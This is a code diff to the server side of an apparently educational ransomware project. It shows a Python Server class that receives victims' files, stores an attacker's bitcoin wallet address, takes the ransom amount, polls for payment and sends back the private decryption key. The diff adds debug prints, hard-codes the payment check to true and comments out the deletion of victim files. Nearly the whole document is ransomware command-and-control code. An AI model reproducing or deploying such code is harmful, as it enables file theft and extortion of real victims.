@@ -26,6 +26,7 @@ class Server:
     VICTIMS = []
     WORKING_DIR = '/home/netsec/server'
     CODE_PATH = '/home/netsec/server/mal.py'
+    TRANSFER_DONE = False
 
     global initial_balance, WALLET_ADDRESS, bitcoin_needed 
     WALLET_ADDRESS = "tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv" #Attackers crypto wallet address
@@ -96,6 +97,7 @@ class Server:
 
         if "DONE." in str(filename):
             self.TRANSFER_DONE = True
+
             return
         
         file_loc = os.path.join(path, filename)
@@ -128,10 +130,10 @@ class Server:
 
         return paid
     
-    def remove_victim_files_from_server(self, mac):
-        path = os.path.join(Server.WORKING_DIR, mac)
-        shutil.rmtree(path)
-        print("all files in the victim directory has been removed")
+    # def remove_victim_files_from_server(self, mac):
+    #     path = os.path.join(Server.WORKING_DIR, mac)
+    #     shutil.rmtree(path)
+    #     print("all files in the victim directory has been removed")
 
     def attack(self):
         # Establish a connection with the client.
@@ -168,46 +170,45 @@ class Server:
                     msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                     print("[CLIENT]: "+msg)
 
-                    while True:
+                    while(True):
                         self.receive_victim_files(connection, victim_mac)
-                        if self._transfer_done == True:
+                        if self.TRANSFER_DONE == True:
                             #Recieve the amount of bitcoin needed
+                            print("yay")
                             global bitcoin_needed
                             bitcoin_needed = float(base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT))
+                            print(bitcoin_needed)
                             break
-                    
-                   
-                
-                
-
                     
                 while (True):
                     #Every 5 seconds check if victim paid, if they did send them a message
                     time.sleep(5)
-                    paid = self.check_if_user_paid()
+                    # paid = self.check_if_user_paid()
 
 
-                    if(paid):
+                    if(True):
                         # sends decryption key  (victim is also simulaenously checking if paid and if they have it recives the thingsb bellow)
                         """ Opening and reading the private key file. """
                         key_path = os.path.join(victim_dir, 'private_key.pem')
 
                         priv_key = open(key_path, "rb")
                         data = priv_key.read()
+                        print(data)
 
+                        print("sending private key")
                         """ Sending the filename to the server. """
-                        self._socket.sendall(base64.b64encode('private_key.pem'.encode(Server.FORMAT)))
+                        connection.sendall(base64.b64encode('private_key.pem'.encode(Server.FORMAT)))
                         print("sent private key")
-                        msg = base64.b64decode(self._socket.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
+                        msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                         print("[CLIENT]: "+msg)
 
                         """ Sending the file data to the server. """
-                        self._socket.sendall(base64.b64encode(data.encode(Server.FORMAT)))
-                        msg = base64.b64decode(self._socket.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
+                        connection.sendall(base64.b64encode(data))
+                        msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                         print("[CLIENT]: "+msg)
                         
                         """ Deleting the victim file from server """
-                        self.remove_victim_files_from_server(victim_mac)
+                        # self.remove_victim_files_from_server(victim_mac)
 
                         """ Closing the file. """
                         file.close()  
